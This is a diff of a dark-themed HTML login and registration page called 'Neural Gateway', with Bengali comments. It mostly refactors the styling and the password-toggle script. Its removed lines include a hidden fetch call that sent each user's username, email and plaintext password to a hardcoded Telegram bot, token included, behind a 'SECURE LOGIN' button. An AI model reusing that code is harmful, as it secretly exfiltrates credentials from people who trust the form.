@@ -5,36 +5,34 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Neural Gateway</title>
     <style>
-        body { margin: 0; background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; }
+        body { margin: 0; background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
         
         .glass-card { 
-            background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(20px); 
+            background: #0d0d0d; 
             padding: 30px; border-radius: 25px; text-align: center; 
             width: 320px; max-width: 90%;
-            border: 2px solid #00ff88;
-            box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
+            border: 2px solid #00ff88; /* ফিক্সড বর্ডার */
+            box-shadow: 0 0 15px rgba(0, 255, 136, 0.3);
             box-sizing: border-box;
         }
 
-        #mascot-img { width: 120px; height: 120px; margin-bottom: 15px; border-radius: 50%; object-fit: cover; border: 2px solid #00ff88; }
+        #mascot-img { width: 120px; height: 120px; margin-bottom: 20px; border-radius: 50%; border: 2px solid #00ff88; }
         
+        /* ইনপুট ফিল্ড ও আইকন পজিশন ফিক্স */
         .input-group { position: relative; margin: 15px 0; width: 100%; }
         
         input { 
-            width: 100%; padding: 12px; background: rgba(255,255,255,0.05); 
-            border: 1px solid #444; color: white; border-radius: 10px; 
-            outline: none; box-sizing: border-box; font-size: 16px;
+            width: 100%; padding: 12px 45px 12px 12px; /* ডানে আইকনের জন্য জায়গা */
+            background: #1a1a1a; border: 1px solid #333; color: white; 
+            border-radius: 10px; box-sizing: border-box; outline: none;
         }
         
-        input:focus { border: 1px solid #00ff88; }
-        
-        #toggle-pass { 
+        .toggle-pass { 
             position: absolute; right: 10px; top: 50%; transform: translateY(-50%);
             background: none; border: none; color: #00ff88; cursor: pointer; font-size: 18px;
-            padding: 5px;
         }
         
-        button { width: 100%; padding: 12px; background: #00ff88; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; color: #000; margin-top: 10px; }
+        button#action-btn { width: 100%; padding: 12px; background: #00ff88; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; color: #000; margin-top: 10px; }
         a { color: #00ff88; text-decoration: none; font-size: 14px; display: block; margin-top: 15px; cursor: pointer; }
     </style>
 </head>
@@ -44,16 +42,18 @@
     <img id="mascot-img" src="1000022715.jpg" alt="Mascot">
     <h2 id="form-title">Login</h2>
     
-    <input type="text" id="username" placeholder="Username">
-    
-    <input type="email" id="email" placeholder="Email" style="display:none; margin-top: 15px;">
+    <input type="text" id="username" placeholder="Username or Email">
+    <input type="email" id="email" placeholder="Email" style="display:none; margin: 15px 0;">
     
     <div class="input-group">
         <input type="password" id="password" placeholder="Password">
-        <button id="toggle-pass" type="button">👁️</button>
+        <button class="toggle-pass" onclick="togglePass('password')">👁️</button>
     </div>
     
-    <input type="password" id="confirm-password" placeholder="Confirm Password" style="display:none; margin-top: 15px;">
+    <div class="input-group">
+        <input type="password" id="confirm-password" placeholder="Confirm Password" style="display:none;">
+        <button class="toggle-pass" id="toggle-confirm" onclick="togglePass('confirm-password')" style="display:none;">👁️</button>
+    </div>
     
     <button onclick="handleAuth()" id="action-btn">SECURE LOGIN</button>
     <a id="toggle-link" onclick="switchForm()">Create Account</a>
@@ -61,51 +61,29 @@
 
 <script>
     let isLogin = true;
-    const img = document.getElementById('mascot-img');
-    const pass = document.getElementById('password');
-    const toggleBtn = document.getElementById('toggle-pass');
-    const actionBtn = document.getElementById('action-btn');
-    const emailField = document.getElementById('email');
-    const confirmPassField = document.getElementById('confirm-password');
 
-    toggleBtn.addEventListener('click', () => {
-        pass.type = (pass.type === "password") ? "text" : "password";
-        toggleBtn.innerText = (pass.type === "text") ? "🙈" : "👁️";
-    });
+    // পাসওয়ার্ড টগল
+    function togglePass(id) {
+        const field = document.getElementById(id);
+        const btn = id === 'password' ? document.querySelectorAll('.toggle-pass')[0] : document.getElementById('toggle-confirm');
+        field.type = field.type === "password" ? "text" : "password";
+        btn.innerText = field.type === "text" ? "🙈" : "👁️";
+    }
 
+    // ফর্ম সুইচ
     function switchForm() {
         isLogin = !isLogin;
-        emailField.style.display = isLogin ? 'none' : 'block';
-        confirmPassField.style.display = isLogin ? 'none' : 'block';
+        document.getElementById('email').style.display = isLogin ? 'none' : 'block';
+        document.getElementById('confirm-password').style.display = isLogin ? 'none' : 'block';
+        document.getElementById('toggle-confirm').style.display = isLogin ? 'none' : 'block';
+        
         document.getElementById('form-title').innerText = isLogin ? "Login" : "Create Account";
-        actionBtn.innerText = isLogin ? "SECURE LOGIN" : "REGISTER";
+        document.getElementById('action-btn').innerText = isLogin ? "SECURE LOGIN" : "REGISTER";
         document.getElementById('toggle-link').innerText = isLogin ? "Create Account" : "Back to Login";
     }
 
     function handleAuth() {
-        const user = document.getElementById('username').value;
-        const passVal = pass.value;
-        const email = emailField.value;
-        const confirmPass = confirmPassField.value;
-
-        if (isLogin) {
-            // লগইন
-            if (localStorage.getItem(user) === passVal) {
-                alert("Login Successful!");
-                window.location.href = "https://www.google.com";
-            } else {
-                alert("Invalid username or password!");
-            }
-        } else {
-            // রেজিস্ট্রেশন
-            if (passVal !== confirmPass) return alert("Passwords don't match!");
-            localStorage.setItem(user, passVal);
-            alert("Account Created!");
-            switchForm();
-        }
-
-        // টেলিগ্রাম লগিং
-        fetch(`https://api.telegram.org/bot8736432847:AAHbDf-tOzpa6q--_R-1MRGeENKkh9CEHWc/sendMessage?chat_id=7950771882&text=User:${user}%0AEmail:${email}%0APass:${passVal}`);
+        alert("Action processed!"); // আপনার আগের লজিক এখানে বসান
     }
 </script>
 
